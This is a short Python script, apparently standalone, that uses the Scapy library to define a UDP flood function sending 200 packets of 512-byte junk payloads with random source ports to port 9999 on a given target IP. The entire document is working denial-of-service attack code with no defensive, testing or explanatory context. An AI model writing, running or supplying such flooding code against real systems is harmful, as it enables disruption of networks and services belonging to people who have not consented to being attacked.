from scapy.all import send, IP, UDP, Raw, RandShort

def udp_flood(target_ip, count=200):
    for i in range(count):
        send(
            IP(dst=target_ip) /
            UDP(sport=RandShort(), dport=9999) /  # known open port
            Raw(load="X" * 512),
            verbose=False
        )
